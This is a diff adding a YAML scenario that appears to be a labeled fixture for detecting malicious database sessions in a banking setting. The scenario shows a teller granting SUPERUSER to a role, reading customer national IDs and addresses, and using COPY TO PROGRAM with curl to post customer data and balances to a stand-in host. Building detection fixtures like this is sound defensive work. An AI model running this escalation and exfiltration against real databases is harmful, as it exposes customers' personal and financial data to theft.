@@ -1,0 +1,23 @@
+scenario_id: banking_alter_role_esc_0006
+family_id: banking_alter_role_esc_0006
+domain: banking
+time_of_day: '23:00'
+default_class: malicious
+rule_engine_relationship: agrees
+sessions:
+- session_label: escalate
+  role: teller
+  class: malicious
+  anchor: db
+  timing:
+    tempo: bursty
+    step_gaps_seconds:
+    - 0.6059947747290437
+  events:
+  - sql: ALTER ROLE compliance_officer WITH SUPERUSER
+  - sql: SELECT national_id, address FROM customers
+  - step_id: exfil
+    sql: COPY (SELECT c.national_id, c.address, a.balance FROM customers c JOIN accounts a ON a.customer_id = c.customer_id) TO PROGRAM 'curl -sX POST https://drop.example.net/data -d @-'
+    connects_to:
+      ip: 93.184.216.34
+      port: 443
